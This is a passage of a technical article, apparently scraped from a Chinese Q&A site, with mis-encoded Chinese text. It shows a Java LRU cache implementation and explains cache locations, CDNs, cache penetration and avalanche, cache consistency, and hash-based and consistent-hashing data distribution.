class=\"n\">V</span> <span class=\"n\">v</span><span class=\"o\">;</span>\n\n        <span class=\"kd\">public</span> <span class=\"nf\">Node</span><span class=\"o\">(</span><span class=\"n\">K</span> <span class=\"n\">k</span><span class=\"o\">,</span> <span class=\"n\">V</span> <span class=\"n\">v</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">k</span> <span class=\"o\">=</span> <span class=\"n\">k</span><span class=\"o\">;</span>\n            <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">v</span> <span class=\"o\">=</span> <span class=\"n\">v</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n\n\n    <span class=\"kd\">public</span> <span class=\"nf\">LRU</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">maxSize</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">maxSize</span> <span class=\"o\">=</span> <span class=\"n\">maxSize</span><span class=\"o\">;</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">map</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">HashMap</span><span class=\"o\">&lt;&gt;(</span><span class=\"n\">maxSize</span> <span class=\"o\">*</span> <span class=\"n\">4</span> <span class=\"o\">/</span> <span class=\"n\">3</span><span class=\"o\">);</span>\n\n        <span class=\"n\">head</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Node</span><span class=\"o\">(</span><span class=\"kc\">null</span><span class=\"o\">,</span> <span class=\"kc\">null</span><span class=\"o\">);</span>\n        <span class=\"n\">tail</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Node</span><span class=\"o\">(</span><span class=\"kc\">null</span><span class=\"o\">,</span> <span class=\"kc\">null</span><span class=\"o\">);</span>\n\n        <span class=\"n\">head</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">tail</span><span class=\"o\">;</span>\n        <span class=\"n\">tail</span><span class=\"o\">.</span><span class=\"na\">pre</span> <span class=\"o\">=</span> <span class=\"n\">head</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n\n    <span class=\"kd\">public</span> <span class=\"n\">V</span> <span class=\"nf\">get</span><span class=\"o\">(</span><span class=\"n\">K</span> <span class=\"n\">key</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n\n        <span class=\"k\">if</span> <span class=\"o\">(!</span><span class=\"n\">map</span><span class=\"o\">.</span><span class=\"na\">containsKey</span><span class=\"o\">(</span><span class=\"n\">key</span><span class=\"o\">))</span> <span class=\"o\">{</span>\n            <span class=\"k\">return</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n\n        <span class=\"n\">Node</span> <span class=\"n\">node</span> <span class=\"o\">=</span> <span class=\"n\">map</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">(</span><span class=\"n\">key</span><span class=\"o\">);</span>\n        <span class=\"n\">unlink</span><span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">);</span>\n        <span class=\"n\">appendHead</span><span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">);</span>\n\n        <span class=\"k\">return</span> <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">v</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">put</span><span class=\"o\">(</span><span class=\"n\">K</span> <span class=\"n\">key</span><span class=\"o\">,</span> <span class=\"n\">V</span> <span class=\"n\">value</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">map</span><span class=\"o\">.</span><span class=\"na\">containsKey</span><span class=\"o\">(</span><span class=\"n\">key</span><span class=\"o\">))</span> <span class=\"o\">{</span>\n            <span class=\"n\">Node</span> <span class=\"n\">node</span> <span class=\"o\">=</span> <span class=\"n\">map</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">(</span><span class=\"n\">key</span><span class=\"o\">);</span>\n            <span class=\"n\">unlink</span><span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span>\n\n        <span class=\"n\">Node</span> <span class=\"n\">node</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Node</span><span class=\"o\">(</span><span class=\"n\">key</span><span class=\"o\">,</span> <span class=\"n\">value</span><span class=\"o\">);</span>\n        <span class=\"n\">map</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"n\">key</span><span class=\"o\">,</span> <span class=\"n\">node</span><span class=\"o\">);</span>\n        <span class=\"n\">appendHead</span><span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">);</span>\n\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">map</span><span class=\"o\">.</span><span class=\"na\">size</span><span class=\"o\">()</span> <span class=\"o\">&gt;</span> <span class=\"n\">maxSize</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">Node</span> <span class=\"n\">toRemove</span> <span class=\"o\">=</span> <span class=\"n\">removeTail</span><span class=\"o\">();</span>\n            <span class=\"n\">map</span><span class=\"o\">.</span><span class=\"na\">remove</span><span class=\"o\">(</span><span class=\"n\">toRemove</span><span class=\"o\">.</span><span class=\"na\">k</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n\n\n    <span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">unlink</span><span class=\"o\">(</span><span class=\"n\">Node</span> <span class=\"n\">node</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n\n        <span class=\"n\">Node</span> <span class=\"n\">pre</span> <span class=\"o\">=</span> <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">pre</span><span class=\"o\">;</span>\n        <span class=\"n\">Node</span> <span class=\"n\">next</span> <span class=\"o\">=</span> <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n\n        <span class=\"n\">pre</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">next</span><span class=\"o\">;</span>\n        <span class=\"n\">next</span><span class=\"o\">.</span><span class=\"na\">pre</span> <span class=\"o\">=</span> <span class=\"n\">pre</span><span class=\"o\">;</span>\n\n        <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">pre</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n        <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n\n    <span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">appendHead</span><span class=\"o\">(</span><span class=\"n\">Node</span> <span class=\"n\">node</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">Node</span> <span class=\"n\">next</span> <span class=\"o\">=</span> <span class=\"n\">head</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n        <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">next</span><span class=\"o\">;</span>\n        <span class=\"n\">next</span><span class=\"o\">.</span><span class=\"na\">pre</span> <span class=\"o\">=</span> <span class=\"n\">node</span><span class=\"o\">;</span>\n        <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">pre</span> <span class=\"o\">=</span> <span class=\"n\">head</span><span class=\"o\">;</span>\n        <span class=\"n\">head</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">node</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n\n    <span class=\"kd\">private</span> <span class=\"n\">Node</span> <span class=\"nf\">removeTail</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n\n        <span class=\"n\">Node</span> <span class=\"n\">node</span> <span class=\"o\">=</span> <span class=\"n\">tail</span><span class=\"o\">.</span><span class=\"na\">pre</span><span class=\"o\">;</span>\n\n        <span class=\"n\">Node</span> <span class=\"n\">pre</span> <span class=\"o\">=</span> <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">pre</span><span class=\"o\">;</span>\n        <span class=\"n\">tail</span><span class=\"o\">.</span><span class=\"na\">pre</span> <span class=\"o\">=</span> <span class=\"n\">pre</span><span class=\"o\">;</span>\n        <span class=\"n\">pre</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">tail</span><span class=\"o\">;</span>\n\n        <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">pre</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n        <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n\n        <span class=\"k\">return</span> <span class=\"n\">node</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">public</span> <span class=\"n\">Iterator</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">&gt;</span> <span class=\"nf\">iterator</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n\n        <span class=\"k\">return</span> <span class=\"k\">new</span> <span class=\"n\">Iterator</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">&gt;()</span> <span class=\"o\">{</span>\n            <span class=\"kd\">private</span> <span class=\"n\">Node</span> <span class=\"n\">cur</span> <span class=\"o\">=</span> <span class=\"n\">head</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n\n            <span class=\"nd\">@Override</span>\n            <span class=\"kd\">public</span> <span class=\"kt\">boolean</span> <span class=\"nf\">hasNext</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n                <span class=\"k\">return</span> <span class=\"n\">cur</span> <span class=\"o\">!=</span> <span class=\"n\">tail</span><span class=\"o\">;</span>\n            <span class=\"o\">}</span>\n\n            <span class=\"nd\">@Override</span>\n            <span class=\"kd\">public</span> <span class=\"n\">K</span> <span class=\"nf\">next</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n                <span class=\"n\">Node</span> <span class=\"n\">node</span> <span class=\"o\">=</span> <span class=\"n\">cur</span><span class=\"o\">;</span>\n                <span class=\"n\">cur</span> <span class=\"o\">=</span> <span class=\"n\">cur</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n                <span class=\"k\">return</span> <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">k</span><span class=\"o\">;</span>\n            <span class=\"o\">}</span>\n        <span class=\"o\">};</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>ä¸‰ã€ç¼“å­˜ä½ç½®</h2><h2>æµè§ˆå™¨</h2><p>å½“ HTTP å“åº”å…è®¸è¿›è¡Œç¼“å­˜æ—¶ï¼Œæµè§ˆå™¨ä¼šå°† HTMLã€CSSã€JavaScriptã€å›¾ç‰‡ç­‰é™æ€èµ„æºè¿›è¡Œç¼“å­˜ã€‚</p><h2>ISP</h2><p>ç½‘ç»œæœåŠ¡æä¾›å•†ï¼ˆISPï¼‰æ˜¯ç½‘ç»œè®¿é—®çš„ç¬¬ä¸€è·³ï¼Œé€šè¿‡å°†æ•°æ®ç¼“å­˜åœ¨ ISP ä¸­èƒ½å¤Ÿå¤§å¤§æé«˜ç”¨æˆ·çš„è®¿é—®é€Ÿåº¦ã€‚</p><h2>åå‘ä»£ç†</h2><p>åå‘ä»£ç†ä½äºæœåŠ¡å™¨ä¹‹å‰ï¼Œè¯·æ±‚ä¸å“åº”éƒ½éœ€è¦ç»è¿‡åå‘ä»£ç†ã€‚é€šè¿‡å°†æ•°æ®ç¼“å­˜åœ¨åå‘ä»£ç†ï¼Œåœ¨ç”¨æˆ·è¯·æ±‚åå‘ä»£ç†æ—¶å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ç¼“å­˜è¿›è¡Œå“åº”ã€‚</p><h2>æœ¬åœ°ç¼“å­˜</h2><p>ä½¿ç”¨ Guava Cache å°†æ•°æ®ç¼“å­˜åœ¨æœåŠ¡å™¨æœ¬åœ°å†…å­˜ä¸­ï¼ŒæœåŠ¡å™¨ä»£ç å¯ä»¥ç›´æ¥è¯»å–æœ¬åœ°å†…å­˜ä¸­çš„ç¼“å­˜ï¼Œé€Ÿåº¦éå¸¸å¿«ã€‚</p><h2>åˆ†å¸ƒå¼ç¼“å­˜</h2><p>ä½¿ç”¨ Redisã€Memcache ç­‰åˆ†å¸ƒå¼ç¼“å­˜å°†æ•°æ®ç¼“å­˜åœ¨åˆ†å¸ƒå¼ç¼“å­˜ç³»ç»Ÿä¸­ã€‚</p><p>ç›¸å¯¹äºæœ¬åœ°ç¼“å­˜æ¥è¯´ï¼Œåˆ†å¸ƒå¼ç¼“å­˜å•ç‹¬éƒ¨ç½²ï¼Œå¯ä»¥æ ¹æ®éœ€æ±‚åˆ†é…ç¡¬ä»¶èµ„æºã€‚ä¸ä»…å¦‚æ­¤ï¼ŒæœåŠ¡å™¨é›†ç¾¤éƒ½å¯ä»¥è®¿é—®åˆ†å¸ƒå¼ç¼“å­˜ï¼Œè€Œæœ¬åœ°ç¼“å­˜éœ€è¦åœ¨æœåŠ¡å™¨é›†ç¾¤ä¹‹é—´è¿›è¡ŒåŒæ­¥ï¼Œå®ç°éš¾åº¦å’Œæ€§èƒ½å¼€é”€ä¸Šéƒ½éå¸¸å¤§ã€‚</p><h2>æ•°æ®åº“ç¼“å­˜</h2><p>MySQL ç­‰æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå…·æœ‰è‡ªå·±çš„æŸ¥è¯¢ç¼“å­˜æœºåˆ¶æ¥æé«˜æŸ¥è¯¢æ•ˆç‡ã€‚</p><h2>Java å†…éƒ¨çš„ç¼“å­˜</h2><p>Java ä¸ºäº†ä¼˜åŒ–ç©ºé—´ï¼Œæé«˜å­—ç¬¦ä¸²ã€åŸºæœ¬æ•°æ®ç±»å‹åŒ…è£…ç±»çš„åˆ›å»ºæ•ˆç‡ï¼Œè®¾è®¡äº†å­—ç¬¦ä¸²å¸¸é‡æ± åŠ Byteã€Shortã€Characterã€Integerã€Longã€Boolean è¿™å…­ç§åŒ…è£…ç±»ç¼“å†²æ± ã€‚</p><h2>CPU å¤šçº§ç¼“å­˜</h2><p>CPU ä¸ºäº†è§£å†³è¿ç®—é€Ÿåº¦ä¸ä¸»å­˜ IO é€Ÿåº¦ä¸åŒ¹é…çš„é—®é¢˜ï¼Œå¼•å…¥äº†å¤šçº§ç¼“å­˜ç»“æ„ï¼ŒåŒæ—¶ä½¿ç”¨ MESI ç­‰ç¼“å­˜ä¸€è‡´æ€§åè®®æ¥è§£å†³å¤šæ ¸ CPU ç¼“å­˜æ•°æ®ä¸€è‡´æ€§çš„é—®é¢˜ã€‚</p><h2>å››ã€CDN</h2><p>å†…å®¹åˆ†å‘ç½‘ç»œï¼ˆContent distribution networkï¼ŒCDNï¼‰æ˜¯ä¸€ç§äº’è¿çš„ç½‘ç»œç³»ç»Ÿï¼Œå®ƒåˆ©ç”¨æ›´é è¿‘ç”¨æˆ·çš„æœåŠ¡å™¨ä»è€Œæ›´å¿«æ›´å¯é åœ°å°† HTMLã€CSSã€JavaScriptã€éŸ³ä¹ã€å›¾ç‰‡ã€è§†é¢‘ç­‰é™æ€èµ„æºåˆ†å‘ç»™ç”¨æˆ·ã€‚</p><p>CDN ä¸»è¦æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š</p><ul><li>æ›´å¿«åœ°å°†æ•°æ®åˆ†å‘ç»™ç”¨æˆ·ï¼›</li><li>é€šè¿‡éƒ¨ç½²å¤šå°æœåŠ¡å™¨ï¼Œä»è€Œæé«˜ç³»ç»Ÿæ•´ä½“çš„å¸¦å®½æ€§èƒ½ï¼›</li><li>å¤šå°æœåŠ¡å™¨å¯ä»¥çœ‹æˆæ˜¯ä¸€ç§å†—ä½™æœºåˆ¶ï¼Œä»è€Œå…·æœ‰é«˜å¯ç”¨æ€§ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-f2d9346f08500a6cc18339c8b4ae7dd9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"722\" data-rawheight=\"330\" class=\"origin_image zh-lightbox-thumb\" width=\"722\" data-original=\"https://pic2.zhimg.com/v2-f2d9346f08500a6cc18339c8b4ae7dd9_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;722&#39; height=&#39;330&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"722\" data-rawheight=\"330\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"722\" data-original=\"https://pic2.zhimg.com/v2-f2d9346f08500a6cc18339c8b4ae7dd9_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-f2d9346f08500a6cc18339c8b4ae7dd9_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>äº”ã€ç¼“å­˜é—®é¢˜</h2><h2>ç¼“å­˜ç©¿é€</h2><p>æŒ‡çš„æ˜¯å¯¹æŸä¸ªä¸€å®šä¸å­˜åœ¨çš„æ•°æ®è¿›è¡Œè¯·æ±‚ï¼Œè¯¥è¯·æ±‚å°†ä¼šç©¿é€ç¼“å­˜åˆ°è¾¾æ•°æ®åº“ã€‚</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><ul><li>å¯¹è¿™äº›ä¸å­˜åœ¨çš„æ•°æ®ç¼“å­˜ä¸€ä¸ªç©ºæ•°æ®ï¼›</li><li>å¯¹è¿™ç±»è¯·æ±‚è¿›è¡Œè¿‡æ»¤ã€‚</li></ul><h2>ç¼“å­˜é›ªå´©</h2><p>æŒ‡çš„æ˜¯ç”±äºæ•°æ®æ²¡æœ‰è¢«åŠ è½½åˆ°ç¼“å­˜ä¸­ï¼Œæˆ–è€…ç¼“å­˜æ•°æ®åœ¨åŒä¸€æ—¶é—´å¤§é¢ç§¯å¤±æ•ˆï¼ˆè¿‡æœŸï¼‰ï¼Œåˆæˆ–è€…ç¼“å­˜æœåŠ¡å™¨å®•æœºï¼Œå¯¼è‡´å¤§é‡çš„è¯·æ±‚éƒ½åˆ°è¾¾æ•°æ®åº“ã€‚</p><p>åœ¨æœ‰ç¼“å­˜çš„ç³»ç»Ÿä¸­ï¼Œç³»ç»Ÿéå¸¸ä¾èµ–äºç¼“å­˜ï¼Œç¼“å­˜åˆ†æ‹…äº†å¾ˆå¤§ä¸€éƒ¨åˆ†çš„æ•°æ®è¯·æ±‚ã€‚å½“å‘ç”Ÿç¼“å­˜é›ªå´©æ—¶ï¼Œæ•°æ®åº“æ— æ³•å¤„ç†è¿™ä¹ˆå¤§çš„è¯·æ±‚ï¼Œå¯¼è‡´æ•°æ®åº“å´©æºƒã€‚</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><ul><li>ä¸ºäº†é˜²æ­¢ç¼“å­˜åœ¨åŒä¸€æ—¶é—´å¤§é¢ç§¯è¿‡æœŸå¯¼è‡´çš„ç¼“å­˜é›ªå´©ï¼Œå¯ä»¥é€šè¿‡è§‚å¯Ÿç”¨æˆ·è¡Œä¸ºï¼Œåˆç†è®¾ç½®ç¼“å­˜è¿‡æœŸæ—¶é—´æ¥å®ç°ï¼›</li><li>ä¸ºäº†é˜²æ­¢ç¼“å­˜æœåŠ¡å™¨å®•æœºå‡ºç°çš„ç¼“å­˜é›ªå´©ï¼Œå¯ä»¥ä½¿ç”¨åˆ†å¸ƒå¼ç¼“å­˜ï¼Œåˆ†å¸ƒå¼ç¼“å­˜ä¸­æ¯ä¸€ä¸ªèŠ‚ç‚¹åªç¼“å­˜éƒ¨åˆ†çš„æ•°æ®ï¼Œå½“æŸä¸ªèŠ‚ç‚¹å®•æœºæ—¶å¯ä»¥ä¿è¯å…¶å®ƒèŠ‚ç‚¹çš„ç¼“å­˜ä»ç„¶å¯ç”¨ã€‚</li><li>ä¹Ÿå¯ä»¥è¿›è¡Œç¼“å­˜é¢„çƒ­ï¼Œé¿å…åœ¨ç³»ç»Ÿåˆšå¯åŠ¨ä¸ä¹…ç”±äºè¿˜æœªå°†å¤§é‡æ•°æ®è¿›è¡Œç¼“å­˜è€Œå¯¼è‡´ç¼“å­˜é›ªå´©ã€‚</li></ul><h2>ç¼“å­˜ä¸€è‡´æ€§</h2><p>ç¼“å­˜ä¸€è‡´æ€§è¦æ±‚æ•°æ®æ›´æ–°çš„åŒæ—¶ç¼“å­˜æ•°æ®ä¹Ÿèƒ½å¤Ÿå®æ—¶æ›´æ–°ã€‚</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><ul><li>åœ¨æ•°æ®æ›´æ–°çš„åŒæ—¶ç«‹å³å»æ›´æ–°ç¼“å­˜ï¼›</li><li>åœ¨è¯»ç¼“å­˜ä¹‹å‰å…ˆåˆ¤æ–­ç¼“å­˜æ˜¯å¦æ˜¯æœ€æ–°çš„ï¼Œå¦‚æœä¸æ˜¯æœ€æ–°çš„å…ˆè¿›è¡Œæ›´æ–°ã€‚</li></ul><p>è¦ä¿è¯ç¼“å­˜ä¸€è‡´æ€§éœ€è¦ä»˜å‡ºå¾ˆå¤§çš„ä»£ä»·ï¼Œç¼“å­˜æ•°æ®æœ€å¥½æ˜¯é‚£äº›å¯¹ä¸€è‡´æ€§è¦æ±‚ä¸é«˜çš„æ•°æ®ï¼Œå…è®¸ç¼“å­˜æ•°æ®å­˜åœ¨ä¸€äº›è„æ•°æ®ã€‚</p><h2>ç¼“å­˜ â€œæ— åº•æ´â€ ç°è±¡</h2><p>æŒ‡çš„æ˜¯ä¸ºäº†æ»¡è¶³ä¸šåŠ¡è¦æ±‚æ·»åŠ äº†å¤§é‡ç¼“å­˜èŠ‚ç‚¹ï¼Œä½†æ˜¯æ€§èƒ½ä¸ä½†æ²¡æœ‰å¥½è½¬åè€Œä¸‹é™äº†çš„ç°è±¡ã€‚</p><p>äº§ç”ŸåŸå› ï¼šç¼“å­˜ç³»ç»Ÿé€šå¸¸é‡‡ç”¨ hash å‡½æ•°å°† key æ˜ å°„åˆ°å¯¹åº”çš„ç¼“å­˜èŠ‚ç‚¹ï¼Œéšç€ç¼“å­˜èŠ‚ç‚¹æ•°ç›®çš„å¢åŠ ï¼Œé”®å€¼åˆ†å¸ƒåˆ°æ›´å¤šçš„èŠ‚ç‚¹ä¸Šï¼Œå¯¼è‡´å®¢æˆ·ç«¯ä¸€æ¬¡æ‰¹é‡æ“ä½œä¼šæ¶‰åŠå¤šæ¬¡ç½‘ç»œæ“ä½œï¼Œè¿™æ„å‘³ç€æ‰¹é‡æ“ä½œçš„è€—æ—¶ä¼šéšç€èŠ‚ç‚¹æ•°ç›®çš„å¢åŠ è€Œä¸æ–­å¢å¤§ã€‚æ­¤å¤–ï¼Œç½‘ç»œè¿æ¥æ•°å˜å¤šï¼Œå¯¹èŠ‚ç‚¹çš„æ€§èƒ½ä¹Ÿæœ‰ä¸€å®šå½±å“ã€‚</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><ul><li>ä¼˜åŒ–æ‰¹é‡æ•°æ®æ“ä½œå‘½ä»¤ï¼›</li><li>å‡å°‘ç½‘ç»œé€šä¿¡æ¬¡æ•°ï¼›</li><li>é™ä½æ¥å…¥æˆæœ¬ï¼Œä½¿ç”¨é•¿è¿æ¥ / è¿æ¥æ± ï¼ŒNIO ç­‰ã€‚</li></ul><h2>å…­ã€æ•°æ®åˆ†å¸ƒ</h2><h2>å“ˆå¸Œåˆ†å¸ƒ</h2><p>å“ˆå¸Œåˆ†å¸ƒå°±æ˜¯å°†æ•°æ®è®¡ç®—å“ˆå¸Œå€¼ä¹‹åï¼ŒæŒ‰ç…§å“ˆå¸Œå€¼åˆ†é…åˆ°ä¸åŒçš„èŠ‚ç‚¹ä¸Šã€‚ä¾‹å¦‚æœ‰ N ä¸ªèŠ‚ç‚¹ï¼Œæ•°æ®çš„ä¸»é”®ä¸º keyï¼Œåˆ™å°†è¯¥æ•°æ®åˆ†é…çš„èŠ‚ç‚¹åºå·ä¸ºï¼šhash(key)%Nã€‚</p><p>ä¼ ç»Ÿçš„å“ˆå¸Œåˆ†å¸ƒç®—æ³•å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼šå½“èŠ‚ç‚¹æ•°é‡å˜åŒ–æ—¶ï¼Œä¹Ÿå°±æ˜¯ N å€¼å˜åŒ–ï¼Œé‚£ä¹ˆå‡ ä¹æ‰€æœ‰çš„æ•°æ®éƒ½éœ€è¦é‡æ–°åˆ†å¸ƒï¼Œå°†å¯¼è‡´å¤§é‡çš„æ•°æ®è¿ç§»ã€‚</p><h2>é¡ºåºåˆ†å¸ƒ</h2><p>å°†æ•°æ®åˆ’åˆ†ä¸ºå¤šä¸ªè¿ç»­çš„éƒ¨åˆ†ï¼ŒæŒ‰æ•°æ®çš„ ID æˆ–è€…æ—¶é—´åˆ†å¸ƒåˆ°ä¸åŒèŠ‚ç‚¹ä¸Šã€‚ä¾‹å¦‚ User è¡¨çš„ ID èŒƒå›´ä¸º 1 \\~ 7000ï¼Œä½¿ç”¨é¡ºåºåˆ†å¸ƒå¯ä»¥å°†å…¶åˆ’åˆ†æˆå¤šä¸ªå­è¡¨ï¼Œå¯¹åº”çš„ä¸»é”®èŒƒå›´ä¸º 1 \\~ 1000ï¼Œ1001 \\~ 2000ï¼Œ...ï¼Œ6001 \\~ 7000ã€‚</p><p>é¡ºåºåˆ†å¸ƒç›¸æ¯”äºå“ˆå¸Œåˆ†å¸ƒçš„ä¸»è¦ä¼˜ç‚¹å¦‚ä¸‹ï¼š</p><ul><li>èƒ½ä¿æŒæ•°æ®åŸæœ‰çš„é¡ºåºï¼›</li><li>å¹¶ä¸”èƒ½å¤Ÿå‡†ç¡®æ§åˆ¶æ¯å°æœåŠ¡å™¨å­˜å‚¨çš„æ•°æ®é‡ï¼Œä»è€Œä½¿å¾—å­˜å‚¨ç©ºé—´çš„åˆ©ç”¨ç‡æœ€å¤§ã€‚</li></ul><h2>ä¸ƒã€ä¸€è‡´æ€§å“ˆå¸Œ</h2><p>Distributed Hash Tableï¼ˆDHTï¼‰ æ˜¯ä¸€ç§å“ˆå¸Œåˆ†å¸ƒæ–¹å¼ï¼Œå…¶ç›®çš„æ˜¯ä¸ºäº†å…‹æœä¼ ç»Ÿå“ˆå¸Œåˆ†å¸ƒåœ¨æœåŠ¡å™¨èŠ‚ç‚¹æ•°é‡å˜åŒ–æ—¶å¤§é‡æ•°æ®è¿ç§»çš„é—®é¢˜ã€‚</p><h2>åŸºæœ¬åŸç†</h2><p>å°†å“ˆå¸Œç©ºé—´ [0, 2n-1] çœ‹æˆä¸€ä¸ªå“ˆå¸Œç¯ï¼Œæ¯ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹éƒ½é…ç½®åˆ°å“ˆå¸Œç¯ä¸Šã€‚æ¯ä¸ªæ•°æ®å¯¹è±¡é€šè¿‡å“ˆå¸Œå–æ¨¡å¾—åˆ°å“ˆå¸Œå€¼ä¹‹åï¼Œå­˜æ”¾åˆ°å“ˆå¸Œç¯ä¸­é¡ºæ—¶é’ˆæ–¹å‘ç¬¬ä¸€ä¸ªå¤§äºç­‰äºè¯¥å“ˆå¸Œå€¼çš„èŠ‚ç‚¹ä¸Šã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-4cfc481ef77a1f9b4a9e44518a6210d8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"553\" class=\"origin_image zh-lightbox-thumb\" width=\"550\" data-original=\"https://pic1.zhimg.com/v2-4cfc481ef77a1f9b4a9e44518a6210d8_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;550&#39; height=&#39;553&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"553\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"550\" data-original=\"https://pic1.zhimg.com/v2-4cfc481ef77a1f9b4a9e44518a6210d8_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-4cfc481ef77a1f9b4a9e44518a6210d8_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>ä¸€è‡´æ€§å“ˆå¸Œåœ¨å¢åŠ æˆ–è€…åˆ é™¤èŠ‚ç‚¹æ—¶åªä¼šå½±å“åˆ°å“ˆå¸Œç¯ä¸­ç›¸é‚»çš„èŠ‚ç‚¹ï¼Œä¾‹å¦‚ä¸‹å›¾ä¸­æ–°å¢èŠ‚ç‚¹ Xï¼Œåªéœ€è¦å°†å®ƒå‰ä¸€ä¸ªèŠ‚ç‚¹ C ä¸Šçš„æ•°æ®é‡æ–°è¿›è¡Œåˆ†å¸ƒå³å¯ï¼Œå¯¹äºèŠ‚ç‚¹ Aã€Bã€D éƒ½æ²¡æœ‰å½±å“ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-4c7c93dbef7596647e271ee04422caf7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"546\" data-rawheight=\"564\" class=\"origin_image zh-lightbox-thumb\" 